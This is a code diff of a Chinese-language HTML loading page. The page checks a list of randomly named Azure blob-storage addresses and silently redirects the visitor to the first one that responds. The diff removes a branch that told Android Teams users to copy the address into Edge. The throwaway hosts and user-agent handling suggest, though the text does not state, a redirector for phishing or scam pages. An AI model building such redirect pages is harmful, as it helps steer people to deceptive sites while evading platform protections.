@@ -5,96 +5,22 @@
 <title>正在加载…</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-  body, html {
-    height: 100%;
-    margin: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: #f7f9fb;
-    font-family: Segoe UI, Roboto, Helvetica;
-    text-align: center;
-    padding: 0 20px;
-  }
-  #bar {
-    width: 60%;
-    height: 6px;
-    border-radius: 3px;
-    overflow: hidden;
-    background: #dde3ec;
-    box-shadow: 0 0 3px rgba(0,0,0,.08) inset;
-  }
-  #bar::after {
-    content: '';
-    display: block;
-    height: 100%;
-    width: 0;
-    background: #4f71ff;
-    animation: load 2s linear infinite;
-  }
-  @keyframes load {
-    0% {width: 0}
-    50% {width: 100%}
-    100% {width: 0}
-  }
-  #err {
-    display: none;
-    color: #666;
-  }
-  #err h1 {
-    font-size: 20px;
-    margin: 16px 0 8px;
-  }
-  #err p {
-    margin: 0 0 16px;
-  }
-  #err button {
-    padding: 8px 16px;
-    border: none;
-    border-radius: 4px;
-    background: #4f71ff;
-    color: #fff;
-    font-size: 14px;
-    cursor: pointer;
-  }
-  #alt {
-    display: none;
-    color: #666;
-  }
-  #alt h1 {
-    font-size: 20px;
-    margin: 16px 0 8px;
-  }
-  #alt p {
-    margin: 0;
-    font-size: 14px;
-  }
-  #copy-box {
-    margin-top: 12px;
-    padding: 10px;
-    background: #e3e8f0;
-    border-radius: 6px;
-    word-break: break-all;
-    font-size: 14px;
-    cursor: pointer;
-    user-select: all;
-  }
+  body,html{height:100%;margin:0;display:flex;align-items:center;justify-content:center;background:#f7f9fb;font-family:Segoe UI,Roboto,Helvetica;}
+  #bar{width:60%;height:6px;border-radius:3px;overflow:hidden;background:#dde3ec;box-shadow:0 0 3px rgba(0,0,0,.08) inset;}
+  #bar::after{content:'';display:block;height:100%;width:0;background:#4f71ff;animation:load 2s linear infinite;}
+  @keyframes load{0%{width:0}50%{width:100%}100%{width:0}}
+  #err{display:none;text-align:center;color:#666;}
+  #err h1{font-size:20px;margin:16px 0 8px}
+  #err p{margin:0 0 24px}
+  #err button{padding:8px 16px;border:none;border-radius:4px;background:#4f71ff;color:#fff;font-size:14px;cursor:pointer}
 </style>
 </head>
 <body>
 <div id="bar"></div>
-
 <div id="err">
   <h1>哎呀，加载失败了…</h1>
   <p>请检查网络或稍后重试</p>
   <button onclick="retry()">重新尝试</button>
-</div>
-
-<div id="alt">
-  <h1>您的手机暂时不支持</h1>
-  <p>请到应用商店下载 <strong>Edge浏览器</strong> </p>
-  <div id="copy-box" onclick="copyUrl()">正在检测可用地址…</div>
-  <p>请复制以上网址到Edge浏览里面打访问</p>
 </div>
 
 <script>
@@ -105,33 +31,14 @@
     "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
     "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
   ];
-  const isAndroid = /android/i.test(navigator.userAgent);
-  const isTeams = /Teams/i.test(navigator.userAgent);
-
-  if (isAndroid && isTeams) {
-    for (const u of urls) {
-      try {
-        await fetch(u, { method: "HEAD", mode: "no-cors", cache: "no-store" });
-        showAlt(u);
-        return;
-      } catch (e) {
-        // try next
-      }
-    }
-    showError();
-    return;
-  }
-
+  const TIMEOUT = 4000;               // 每个 URL 最多等待 4 秒
   for (const u of urls) {
     try {
-      await fetch(u, { method: "HEAD", mode: "no-cors", cache: "no-store" });
-      location.replace(u);
+      await fetch(u, { method: "HEAD", mode: "no-cors", cache: "no-store", timeout: TIMEOUT });
+      location.replace(u);            // 找到可用地址后跳转并结束脚本
       return;
-    } catch (e) {
-      // try next
-    }
+    } catch (e) { /* 继续下一个 */ }
   }
-
   showError();
 })();
 
@@ -139,26 +46,7 @@ function showError() {
   document.getElementById("bar").style.display = "none";
   document.getElementById("err").style.display = "block";
 }
-
-function showAlt(url) {
-  document.getElementById("bar").style.display = "none";
-  document.getElementById("alt").style.display = "block";
-  const box = document.getElementById("copy-box");
-  box.textContent = url;
-  box.dataset.url = url;
-}
-
-function copyUrl() {
-  const url = document.getElementById("copy-box").dataset.url;
-  if (!url) return;
-  navigator.clipboard.writeText(url).then(() => {
-    alert("已复制网址");
-  });
-}
-
-function retry() {
-  location.reload();
-}
+function retry() { location.reload(); }
 </script>
 </body>
 </html>
